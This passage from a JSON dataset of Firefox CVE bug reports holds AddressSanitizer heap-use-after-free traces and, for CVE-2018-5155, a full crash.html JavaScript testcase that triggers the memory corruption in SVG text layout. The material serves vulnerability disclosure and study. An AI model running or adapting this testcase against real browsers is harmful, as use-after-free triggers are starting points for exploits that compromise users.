_$LT$servo_arc..Arc$LT$T$GT$$GT$::drop_slow::h051a8ccf0a675b69 /builds/worker/workspace/build/src/servo/components/servo_arc/lib.rs:256 #11 0x7fdad4a74552 in _$LT$servo_arc..Arc$LT$T$GT$$u20$as$u20$core..ops..drop..Drop$GT$::drop::h27083b96d3340537 /builds/worker/workspace/build/src/servo/components/servo_arc/lib.rs:390 #12 0x7fdad4a74552 in core::ptr::drop_in_place::hbba63d62ce0b4882 /checkout/src/libcore/ptr.rs:59 #13 0x7fdad4a74552 in style::gecko::arc_types::Servo_StyleContext_Release::_$u7b$$u7b$closure$u7d$$u7d$::haa79a1639c6d1f99 /builds/worker/workspace/build/src/servo/components/style/gecko/arc_types.rs:133 #14 0x7fdad4a74552 in _$LT$servo_arc..ArcBorrow$LT$$u27$a$C$$u20$T$GT$$GT$::with_arc::h5bede05e74d34eef /builds/worker/workspace/build/src/servo/components/servo_arc/lib.rs:939 #15 0x7fdad4a74552 in Servo_StyleContext_Release /builds/worker/workspace/build/src/servo/components/style/gecko/arc_types.rs:132 #16 0x7fdaceed3265 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/ServoStyleContext.h:37:20 #17 0x7fdaceed3265 in Release /builds/worker/workspace/build/src/layout/style/nsStyleContextInlines.h:54 #18 0x7fdaceed3265 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:41 #19 0x7fdaceed3265 in Release /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:398 #20 0x7fdaceed3265 in assign_assuming_AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:66 #21 0x7fdaceed3265 in assign_with_AddRef /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:57 #22 0x7fdaceed3265 in operator= /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:193 #23 0x7fdaceed3265 in SetStyleContextWithoutNotification /builds/worker/workspace/build/src/layout/generic/nsIFrame.h:821 #24 0x7fdaceed3265 in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2526 #25 0x7fdaceef7afb in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, nsCSSFrameConstructor::InsertionKind, TreeMatchContext*) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:8064:9 #26 0x7fdaceef15cd in nsCSSFrameConstructor::RecreateFramesForContent(nsIContent*, nsCSSFrameConstructor::InsertionKind) /builds/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:9857:9 #27 0x7fdacee1196d in mozilla::RestyleManager::ProcessRestyledFrames(nsStyleChangeList&) /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:1658:25 #28 0x7fdacee8d4a5 in mozilla::ServoRestyleManager::DoProcessPendingRestyles(mozilla::ServoTraversalFlags) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1188:9 #29 0x7fdacee46836 in ProcessPendingRestyles /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1264:3 #30 0x7fdacee46836 in ProcessPendingRestyles /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:46 #31 0x7fdacee46836 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4211 #32 0x7fdac9e43b05 in FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:572:5 #33 0x7fdac9e43b05 in nsDocument::FlushPendingNotifications(mozilla::FlushType, mozilla::FlushTarget) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7602 #34 0x7fdace036903 in nsSMILAnimationController::DoSample(bool) /builds/worker/workspace/build/src/dom/smil/nsSMILAnimationController.cpp:440:15 #35 0x7fdacdb8aecb in Resample /builds/worker/workspace/build/src/dom/smil/nsSMILAnimationController.h:74:21 #36 0x7fdacdb8aecb in FlushResampleRequests /builds/worker/workspace/build/src/dom/smil/nsSMILAnimationController.h:90 #37 0x7fdacdb8aecb in FlushAnimations /builds/worker/workspace/build/src/dom/svg/nsSVGElement.cpp:2726 #38 0x7fdacdb8aecb in nsSVGEnum::DOMAnimatedEnum::AnimVal() /builds/worker/workspace/build/src/dom/svg/nsSVGEnum.h:97 #39 0x7fdacf5241f3 in nsSVGUtils::GetBBox(nsIFrame*, unsigned int, mozilla::gfx::BaseMatrix<double> const*) /builds/worker/workspace/build/src/layout/svg/nsSVGUtils.cpp:1187:20 #40 0x7fdacf131a1c in ComputeClipForMaskItem /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:2686:22 #41 0x7fdacf131a1c in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsDisplayList*, bool*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:2997 #42 0x7fdacf0596ed in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3755:12 #43 0x7fdacf0eb3fd in nsContainerFrame::BuildDisplayListForNonBlockChildren(nsDisplayListBuilder*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:388:5 #44 0x7fdacf05a27c in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3815:14 #45 0x7fdacf0eb3fd in nsContainerFrame::BuildDisplayListForNonBlockChildren(nsDisplayListBuilder*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:388:5 #46 0x7fdacf513f93 in nsSVGOuterSVGFrame::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/svg/nsSVGOuterSVGFrame.cpp:788:5 #47 0x7fdacf133e19 in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsDisplayList*, bool*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3047:5 #48 0x7fdacf0596ed in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3755:12 #49 0x7fdacf0da52d in nsCanvasFrame::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:568:5 #50 0x7fdacf05a27c in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3815:14 #51 0x7fdacf1dd8ee in mozilla::ScrollFrameHelper::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:3617:15 #52 0x7fdacf05a27c in nsIFrame::BuildDisplayListForChild(nsDisplayListBuilder*, nsIFrame*, nsDisplayListSet const&, unsigned int) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3815:14 #53 0x7fdacf055c2f in mozilla::ViewportFrame::BuildDisplayList(nsDisplayListBuilder*, nsDisplayListSet const&) /builds/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:66:5 #54 0x7fdacf133e19 in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder*, nsDisplayList*, bool*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:3047:5 #55 0x7fdacef75433 in nsLayoutUtils::GetFramesForArea(nsIFrame*, nsRect const&, nsTArray<nsIFrame*>&, unsigned int) /builds/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3330:11 #56 0x7fdacef74afb in nsLayoutUtils::GetFrameForPoint(nsIFrame*, nsPoint, unsigned int) /builds/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3291:8 #57 0x7fdacee1c1a3 in mozilla::FindFrameTargetedByInputEvent(mozilla::WidgetGUIEvent*, nsIFrame*, nsPoint const&, unsigned int) /builds/worker/workspace/build/src/layout/base/PositionedEventTargeting.cpp:548:5 previously allocated by thread T0 (file:// Content) here: #0 0x4c1c93 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x7fdad4a79db2 in alloc_system::platform::_$LT$impl$u20$alloc..allocator..Alloc$u20$for$u20$$RF$$u27$a$u20$alloc_system..System$GT$::alloc::h8cd93390057ad93d /checkout/src/liballoc_system/lib.rs:135 #2 0x7fdad4a79db2 in _$LT$alloc_system..System$u20$as$u20$alloc..allocator..Alloc$GT$::alloc::haa725be1f48230e6 /checkout/src/liballoc_system/lib.rs:57 #3 0x7fdad4a79db2 in __rdl_alloc /checkout/src/libstd/heap.rs:37 #4 0x7fdad4a79db2 in _$LT$alloc..heap..Heap$u20$as$u20$alloc..allocator..Alloc$GT$::alloc::h05b55476c9a26516 /checkout/src/liballoc/heap.rs:84 #5 0x7fdad4a79db2 in alloc::heap::exchange_malloc::h72e689b70b59f4d6 /checkout/src/liballoc/heap.rs:249 #6 0x7fdad4a79db2 in _$LT$alloc..boxed..Box$LT$T$GT$$GT$::new::ha611249e2e31b711 /checkout/src/liballoc/boxed.rs:242 #7 0x7fdad4a79db2 in _$LT$servo_arc..Arc$LT$T$GT$$GT$::new::h751c71290f83200a /builds/worker/workspace/build/src/servo/components/servo_arc/lib.rs:185 #8 0x7fdad4a79db2 in style::gecko_properties::_$LT$impl$u20$style..gecko_bindings..structs..root..mozilla..GeckoEffects$GT$::default::h45253e246a1803b9 /builds/worker/workspace/build/src/obj-firefox/toolkit/library/x86_64-unknown-linux-gnu/release/build/style-6201c7cf09cdb4fe/out/gecko_properties.rs:23318 #9 0x7fdad4a79db2 in style::gecko_properties::ComputedValues::default_values::h79759018a37c1c59 /builds/worker/workspace/build/src/obj-firefox/toolkit/library/x86_64-unknown-linux-gnu/release/build/style-6201c7cf09cdb4fe/out/gecko_properties.rs:269 #10 0x7fdad49e66e9 in style::gecko::media_queries::Device::reset_computed_values::hc53a9fc1b6719b31 /builds/worker/workspace/build/src/servo/components/style/gecko/media_queries.rs:145 #11 0x7fdad49e66e9 in style::gecko::media_queries::Device::rebuild_cached_data::h8f194ecbe0a2ebdf /builds/worker/workspace/build/src/servo/components/style/gecko/media_queries.rs:150 #12 0x7fdad49e66e9 in Servo_StyleSet_RebuildCachedData /builds/worker/workspace/build/src/servo/ports/geckolib/glue.rs:2600 #13 0x7fdacee8803a in mozilla::ServoRestyleManager::PostRebuildAllStyleDataEvent(nsChangeHint, nsRestyleHint) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:424:15 #14 0x7fdac9e71a15 in nsIDocument::FlushUserFontSet() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:12656:22 #15 0x7fdacee4653a in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4187:18 #16 0x7fdac9e43b05 in FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:572:5 #17 0x7fdac9e43b05 in nsDocument::FlushPendingNotifications(mozilla::FlushType, mozilla::FlushTarget) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7602 #18 0x7fdac9e439eb in nsDocument::FlushPendingNotifications(mozilla::FlushType, mozilla::FlushTarget) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7597:22 #19 0x7fdac8b46b47 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:700:14 #20 0x7fdac8b48f7c in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:632:5 #21 0x7fdac8b49f9c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp #22 0x7fdac6daee0a in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #23 0x7fdac6dab4df in mozilla::net::nsLoadGroup::Cancel(nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:258:15 #24 0x7fdac8b46669 in nsDocLoader::Stop() /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:246:22 #25 0x7fdad1fcc6f9 in Stop /builds/worker/workspace/build/src/docshell/base/nsDocShell.h:202:25 #26 0x7fdad1fcc6f9 in nsDocShell::Stop(unsigned int) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5208 #27 0x7fdad1ff1c03 in nsDocShell::InternalLoad(nsIURI*, nsIURI*, mozilla::Maybe<nsCOMPtr<nsIURI> > const&, bool, nsIURI*, unsigned int, nsIPrincipal*, nsIPrincipal*, unsigned int, nsTSubstring<char16_t> const&, char const*, nsTSubstring<char16_t> const&, nsIInputStream*, long, nsIInputStream*, unsigned int, nsISHEntry*, bool, nsTSubstring<char16_t> const&, nsIDocShell*, nsIURI*, nsIDocShell**, nsIRequest**) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #28 0x7fdad1fe8615 in nsDocShell::LoadURI(nsIURI*, nsIDocShellLoadInfo*, unsigned int, bool) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:1017:10 #29 0x7fdac9ed3e76 in nsFrameLoader::ReallyStartLoadingInternal() /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:597:19 #30 0x7fdac9ed2a4b in nsFrameLoader::ReallyStartLoading() /builds/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:474:17 #31 0x7fdac9e29cb9 in nsDocument::MaybeInitializeFinalizeFrameLoaders() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:6696:13 #32 0x7fdac9e2956b in nsDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5151:3 #33 0x7fdacce2af6c in nsHTMLDocument::EndUpdate(unsigned int) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:2265:15 #34 0x7fdac9c1e011 in ~mozAutoDocUpdate /builds/worker/workspace/build/src/dom/base/mozAutoDocUpdate.h:40:18 #35 0x7fdac9c1e011 in mozilla::dom::Element::SetAttr(int, nsAtom*, nsAtom*, nsTSubstring<char16_t> const&, nsIPrincipal*, bool) /builds/worker/workspace/build/src/dom/base/Element.cpp:2588 #36 0x7fdacbf2a937 in SetAttr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:895:12 #37 0x7fdacbf2a937 in SetAttr /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:1648 #38 0x7fdacbf2a937 in SetHTMLAttr /builds/worker/workspace/build/src/dom/html/nsGenericHTMLElement.h:795 #39 0x7fdacbf2a937 in SetSrc /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/HTMLIFrameElement.h:56 #40 0x7fdacbf2a937 in mozilla::dom::HTMLIFrameElementBinding::set_src(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLIFrameElement*, JSJitSetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLIFrameElementBinding.cpp:86 #41 0x7fdacc2fa513 in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2992:8 #42 0x7fdad2d94598 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15 #43 0x7fdad2d94598 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #44 0x7fdad2d96d26 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:516:12 #45 0x7fdad2d96d26 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535 #46 0x7fdad2d96d26 in js::CallSetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:664 #47 0x7fdad3d008c0 in SetExistingProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::Handle<js::NativeObject*>, JS::Handle<JS::PropertyResult>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2765:10 #48 0x7fdad3cf91d6 in bool js::NativeSetProperty<(js::QualifiedBool)1>(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::ObjectOpResult&) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2793:20 #49 0x7fdad2d74a59 in SetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1646:12 #50 0x7fdad2d74a59 in SetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:264 #51 0x7fdad2d74a59 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2882 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:2426:19 in nsIFrame::GetClipPropClipRect(nsStyleDisplay const*, nsStyleEffects const*, nsSize const&) const Shadow bytes around the buggy address: 0x0c0880014f80: fa fa 00 00 00 00 00 fa fa fa fd fd fd fd fd fa 0x0c0880014f90: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa 0x0c0880014fa0: fa fa fd fd fd fd fd fd fa fa 00 00 00 00 00 fa 0x0c0880014fb0: fa fa 00 00 00 00 00 fa fa fa fd fd fd fd fd fa 0x0c0880014fc0: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 00 =>0x0c0880014fd0: fa fa fd fd fd fd fd[fd]fa fa fd fd fd fd fd fd 0x0c0880014fe0: fa fa fd fd fd fd fd fd fa fa fd fd fd fd fd fa 0x0c0880014ff0: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa 0x0c0880015000: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa 0x0c0880015010: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa 0x0c0880015020: fa fa fd fd fd fd fd fa fa fa fd fd fd fd fd fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==5408==ABORTING"
      }
    ],
    "CVE-2018-5155": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1448774",
        "title": "heap-use-after-free in mozilla::CharIterator::GetOriginalGlyphOffsets",
        "description": "The following testcase crashes the latest ASAN build of Firefox 61.0a1 (SourceStamp=b4aeb99d1cb601e5a5288ca05630913fa8528a1c). It requires the attached svg.svg in the same directory. crash.html: <script> function start() { o100=window.open('svg.svg','p58','height=6'); o100.onload=fun0; setTimeout(fun1, 400); } function fun0(e) { o101=e.target;; o109=o101.getElementById('id1'); o120=o101.getElementById('id8'); } function fun1() { o167=o109.ownerDocument; o168=document.createElement('head'); o167.documentElement.appendChild(o168); o120.setAttribute('width','393216'); o206=document.createElement('head'); o167.documentElement.appendChild(o206); o207=document.createElement('style'); o206.appendChild(o207); o207.textContent=\"*{ -moz-transition: 235ms; -moz-border-end-color: green; border-right-style: inset\"; setTimeout(fun2,240); } function fun2() { o120.setAttribute('viewBox','0 0 1000 1000'); o5=document.createElement(\"div\"); o5.innerHTML=\"<svg height='10px' xmlns='http://www.w3.org/2000/svg'><set attributeName='font-weight'><style>*{{}}*{ background-position-x: 1px\"; o168.innerHTML=o5.innerHTML; } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==15139==ERROR: AddressSanitizer: heap-use-after-free on address 0x612000131768 at pc 0x7fa844a5c5d0 bp 0x7ffdd01c31d0 sp 0x7ffdd01c31c8 READ of size 8 at 0x612000131768 thread T0 (file:// Content) #0 0x7fa844a5c5cf in IsClusterStart /builds/worker/workspace/build/src/obj-firefox/dist/include/gfxTextRun.h:113:16 #1 0x7fa844a5c5cf in mozilla::CharIterator::GetOriginalGlyphOffsets(unsigned int&, unsigned int&) const /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:2596 #2 0x7fa844a5c6ea in mozilla::CharIterator::GetGlyphAdvance(nsPresContext*) const /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:2618:3 #3 0x7fa844a7bfee in SVGTextFrame::DoTextPathLayout() /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5108:12 #4 0x7fa844a7fdb5 in SVGTextFrame::DoGlyphPositioning() /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5365:3 #5 0x7fa844a82ce8 in UpdateGlyphPositioning /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5433:5 #6 0x7fa844a82ce8 in SVGTextFrame::TransformFrameRectFromTextChild(nsRect const&, nsIFrame*) /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5734 #7 0x7fa844528b3c in nsLayoutUtils::TransformFrameRectToAncestor(nsIFrame*, nsRect const&, nsIFrame const*, bool*, mozilla::Maybe<mozilla::gfx::Matrix4x4TypedFlagged<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> >*, bool, nsIFrame**) /builds/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3139:27 #8 0x7fa84472631a in IsFrameScrolledOutOfView(nsIFrame*, nsRect const&, nsIFrame*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:11026:5 #9 0x7fa844726190 in nsIFrame::IsScrolledOutOfView() /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:11057:10 #10 0x7fa83ef594a8 in mozilla::dom::KeyframeEffectReadOnly::CanThrottle() const /builds/worker/workspace/build/src/dom/animation/KeyframeEffectReadOnly.cpp:1172:16 #11 0x7fa83ef345d2 in mozilla::dom::KeyframeEffectReadOnly::NotifyAnimationTimingUpdated() /builds/worker/workspace/build/src/dom/animation/KeyframeEffectReadOnly.cpp:134:7 #12 0x7fa83ef32775 in mozilla::dom::Animation::UpdateTiming(mozilla::dom::Animation::SeekFlag, mozilla::dom::Animation::SyncNotifyFlag) /builds/worker/workspace/build/src/dom/animation/Animation.cpp:1346:3 #13 0x7fa83ef2c0f1 in mozilla::dom::Animation::Tick() /builds/worker/workspace/build/src/dom/animation/Animation.cpp:699:3 #14 0x7fa844382440 in mozilla::dom::CSSTransition::Tick() /builds/worker/workspace/build/src/layout/style/nsTransitionManager.cpp:337:14 #15 0x7fa83ef44afe in mozilla::dom::DocumentTimeline::WillRefresh(mozilla::TimeStamp) /builds/worker/workspace/build/src/dom/animation/DocumentTimeline.cpp:184:16 #16 0x7fa844396517 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1884:12 #17 0x7fa8443a6a00 in TickDriver /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:338:13 #18 0x7fa8443a6a00 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:308 #19 0x7fa8443a65c6 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:330:5 #20 0x7fa8443a933e in RunRefreshDrivers /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:771:5 #21 0x7fa8443a933e in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:684 #22 0x7fa8443a8f3e in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:585:9 #23 0x7fa844c56e9f in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /builds/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:68:16 #24 0x7fa83d7cc550 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:156:20 #25 0x7fa83d6b73d4 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1968:28 #26 0x7fa83d25583e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2135:25 #27 0x7fa83d2527c1 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2065:17 #28 0x7fa83d253fbc in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1911:5 #29 0x7fa83d254618 in mozilla::ipc::MessageChannel::MessageTask::Run() /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1944:15 #30 0x7fa83c382568 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1096:14 #31 0x7fa83c39e8d0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #32 0x7fa83d25d396 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:125:5 #33 0x7fa83d1b08a9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #34 0x7fa83d1b08a9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #35 0x7fa83d1b08a9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #36 0x7fa843e3379a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #37 0x7fa8480e478b in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #38 0x7fa83d1b08a9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #39 0x7fa83d1b08a9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #40 0x7fa83d1b08a9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #41 0x7fa8480e416a in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:719:34 #42 0x4f1875 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #43 0x4f1875 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #44 0x7fa85c0be82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #45 0x420f48 in _start (/fuzzer3/firefox/firefox+0x420f48) 0x612000131768 is located 40 bytes inside of 288-byte region [0x612000131740,0x612000131860) freed by thread T0 (file:// Content) here: #0 0x4c1952 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7fa8448e7b61 in ClearTextRuns /builds/worker/workspace/build/src/layout/generic/nsTextFrame.h:626:5 #2 0x7fa8448e7b61 in nsTextFrame::MarkIntrinsicISizesDirty() /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8530 #3 0x7fa8443eeb38 in mozilla::PresShell::FrameNeedsReflow(nsIFrame*, nsIPresShell::IntrinsicDirty, nsFrameState, nsIPresShell::ReflowRootHandling) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:2797:18 #4 0x7fa84443f14d in StyleChangeReflow /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:1234:26 #5 0x7fa84443f14d in mozilla::RestyleManager::ProcessRestyledFrames(nsStyleChangeList&) /builds/worker/workspace/build/src/layout/base/RestyleManager.cpp:1559 #6 0x7fa84444d8f5 in mozilla::ServoRestyleManager::DoProcessPendingRestyles(mozilla::ServoTraversalFlags) /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1188:9 #7 0x7fa844406ffd in ProcessPendingRestyles /builds/worker/workspace/build/src/layout/base/ServoRestyleManager.cpp:1264:3 #8 0x7fa844406ffd in ProcessPendingRestyles /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RestyleManagerInlines.h:43 #9 0x7fa844406ffd in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4259 #10 0x7fa83f3e33c8 in 